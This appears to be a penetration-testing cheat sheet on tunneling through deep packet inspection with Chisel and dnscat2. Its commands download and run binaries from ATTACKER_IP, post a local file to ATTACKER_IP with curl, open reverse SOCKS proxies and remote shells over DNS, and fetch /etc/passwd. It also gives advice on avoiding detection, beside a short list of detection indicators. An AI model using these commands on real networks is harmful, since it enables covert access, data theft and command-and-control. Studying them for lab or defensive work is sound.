# Deep Packet Inspection Bypass

Techniques for tunneling traffic through networks with deep packet inspection (DPI) that block non-standard protocols. Covers HTTP tunneling with Chisel and DNS tunneling with dnscat2.

---

## Decision Tree

```
What protocols are allowed?
  HTTP only  -> Use Chisel (HTTP tunneling)
  DNS only   -> Use dnscat2 (DNS tunneling)
  Multiple   -> Choose based on speed and stealth requirements
```

## Tool Comparison

| Tool | Protocol | Speed | Stealth | Features |
|------|----------|-------|---------|----------|
| Chisel | HTTP (WebSocket) | Slow | Medium | SOCKS proxy, port forwarding |
| dnscat2 | DNS | Very Slow | Low | Full C2: shell, file transfer, port forwarding |
| SSH | SSH | Fast | Medium | Standard tunneling (blocked by DPI) |

---

## Chisel HTTP Tunneling

Chisel creates HTTP tunnels with SSH encryption using a client/server model. Traffic appears as normal HTTP WebSocket communication.

### Architecture
- **Server**: Runs on attacker machine
- **Client**: Runs on compromised host
- **Protocol**: HTTP WebSocket with SSH encryption
- **Platform**: Cross-platform (Linux, Windows, macOS)

### Server Setup
```bash
# Start Chisel server with reverse tunneling
chisel server --port 8080 --reverse

# With authentication fingerprint
chisel server --port 8080 --reverse --fingerprint <key>
```

### Transfer Binary to Target
```bash
# Via web server
sudo cp $(which chisel) /var/www/html/
sudo systemctl start apache2

# Download on target
wget http://ATTACKER_IP/chisel -O /tmp/chisel && chmod +x /tmp/chisel

# Or via SCP
scp chisel user@target:/tmp/chisel
```

### Client Commands

**Reverse SOCKS Proxy**
```bash
# Connect and create reverse SOCKS proxy (binds to port 1080 on server)
/tmp/chisel client ATTACKER_IP:8080 R:socks

# Background execution
/tmp/chisel client ATTACKER_IP:8080 R:socks > /dev/null 2>&1 &

# Error collection
/tmp/chisel client ATTACKER_IP:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://ATTACKER_IP:8080/
```

### Using the SOCKS Proxy

**Verify**
```bash
ss -ntplu | grep 1080
```

**SSH through SOCKS proxy** (SSH has no native SOCKS support)
```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@target
```

**Proxychains**
Edit `/etc/proxychains4.conf`:
```
[ProxyList]
socks5 127.0.0.1 1080
```
```bash
proxychains nmap -sT -Pn -n 10.4.50.215
proxychains smbclient -L //172.16.50.217/ -U user --password=pass
```

### GLIBC Version Mismatch Fix
If you see `GLIBC_2.32 not found`, download a binary compiled with Go 1.19:
```bash
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz
```

### Traffic Analysis
```bash
sudo tcpdump -nvvvXi tun0 tcp port 8080
```
Expected: HTTP GET with WebSocket upgrade headers, `Sec-WebSocket-Protocol: chisel-v3`.

---

## DNS Tunneling Fundamentals

DNS tunneling leverages DNS queries/responses to exfiltrate and infiltrate data through networks that allow DNS but block other protocols.

### DNS Exfiltration Concept
Data is encoded in DNS subdomain queries:
```
[encoded-data-chunk].example.com
```

1. Convert data to hex/base64
2. Split into chunks (DNS subdomain length limits)
3. Send each chunk as a DNS query
4. Server logs all queries and reassembles

### DNS Infiltration via TXT Records
TXT records can contain arbitrary text, allowing data delivery:
```bash
nslookup -type=txt www.example.com
```

### Setting Up DNS Server (Dnsmasq)
```bash
cat > dnsmasq.conf << EOF
no-resolv
no-hosts
auth-zone=example.corp
auth-server=example.corp
EOF

sudo dnsmasq -C dnsmasq.conf -d
```

With TXT records:
```bash
cat > dnsmasq_txt.conf << EOF
no-resolv
no-hosts
auth-zone=example.corp
auth-server=example.corp
txt-record=www.example.corp,"data payload here"
EOF
```

### Requirements for DNS Tunneling
1. Target must be able to make DNS queries
2. DNS resolver must forward queries to the internet
3. Attacker controls an authoritative name server
4. Domain registration points NS records to attacker server

---

## dnscat2 DNS Tunneling

Full-featured DNS tunneling framework providing encrypted, bidirectional communication over DNS. Supports command execution, file transfer, and port forwarding.

### Server Setup
```bash
# Basic server
dnscat2-server example.corp

# With pre-shared secret (recommended)
dnscat2-server example.corp --secret=your-secret-key
```

### Client Setup
```bash
# Basic client
./dnscat example.corp

# With pre-shared secret
./dnscat --secret=your-secret-key example.corp

# Direct connection (no domain needed)
./dnscat --dns server=ATTACKER_IP,port=53 --secret=secret-key
```

### Transfer Binary to Target
```bash
# Via web server
sudo cp dnscat /var/www/html/
wget http://ATTACKER_IP/dnscat -O /tmp/dnscat && chmod +x /tmp/dnscat

# Via SCP
scp dnscat user@target:/tmp/dnscat
```

### Session Management
```bash
# List windows
dnscat2> windows

# Attach to session
dnscat2> window -i 1
```

### Available Commands
```
clear      - Clear screen
delay      - Set delay between packets
download   - Download file from client
exec       - Execute command on client
help       - Show help
listen     - Port forward (like ssh -L)
ping       - Test connection
shell      - Get interactive shell
shutdown   - Shutdown client
tunnels    - List active tunnels
upload     - Upload file to client
```

### Port Forwarding
```bash
# Syntax: listen [lhost:]lport rhost:rport
command (target) 1> listen 127.0.0.1:4455 172.16.2.11:445

# Use the forward
smbclient -p 4455 -L //127.0.0.1/ -U hr_admin --password=Welcome1234

# List active tunnels
command (target) 1> tunnels
```

### Command Execution
```bash
# Single command
command (target) 1> exec id

# Interactive shell
command (target) 1> shell
# New window created, switch to it:
command (target) 1> window -i 2
```

### File Transfer
```bash
# Download from client
command (target) 1> download /etc/passwd

# Upload to client
command (target) 1> upload /path/to/file /tmp/destination
```

### Security Features
- All traffic encrypted by default
- Optional pre-shared secret for authentication
- Authentication string verification (both sides display matching string)

### Performance Tuning
```bash
# Adjust delay between packets
command (target) 1> set delay=100
```

---

## Monitoring Traffic

### Chisel (HTTP)
```bash
sudo tcpdump -nvvvXi tun0 tcp port 8080
```

### dnscat2 (DNS)
```bash
sudo tcpdump -i ens192 udp port 53
sudo tcpdump -nvvvXi ens192 udp port 53
```

### DNS Cache Management
```bash
resolvectl flush-caches
nslookup domain.com SPECIFIC_DNS_SERVER
```

---

## Detection Indicators

### Chisel
- High volume of HTTP requests to a single endpoint
- WebSocket upgrade requests
- Non-standard HTTP traffic patterns
- Traffic to uncommon ports

### dnscat2
- High volume of DNS queries to a single domain
- Queries with unusually long subdomains
- Mix of TXT, CNAME, MX record types
- Encrypted/hex payloads in subdomain names

---

## Workflow Examples

### Chisel Workflow
1. Compromise target (e.g., via web application)
2. Transfer Chisel binary to target
3. Start server: `chisel server --port 8080 --reverse`
4. Start client: `/tmp/chisel client ATTACKER_IP:8080 R:socks`
5. Verify: `ss -ntplu | grep 1080`
6. Use SOCKS proxy with SSH ProxyCommand or Proxychains

### dnscat2 Workflow
1. Set up authoritative DNS server for your domain
2. Start server: `dnscat2-server example.corp`
3. Transfer client binary to target
4. Start client: `./dnscat example.corp`
5. Attach to session: `window -i 1`
6. Set up port forward: `listen 127.0.0.1:4455 172.16.2.11:445`
7. Use port forward: `smbclient -p 4455 //127.0.0.1/`

---

## Best Practices

1. Choose the appropriate tool based on allowed protocols
2. Use authentication (Chisel fingerprints, dnscat2 secrets)
3. Monitor traffic volume to avoid detection
4. Use delays for DNS tunneling to reduce query rate
5. Verify connections with authentication strings
6. Test binary compatibility before deployment
7. Clean up sessions and artifacts when done

---

## Resources

- Chisel: https://github.com/jpillora/chisel
- dnscat2: https://github.com/iagox86/dnscat2
- iodine (IP-over-DNS): https://github.com/yarrick/iodine
- dns2tcp (TCP-over-DNS): https://github.com/alex-sector/dns2tcp
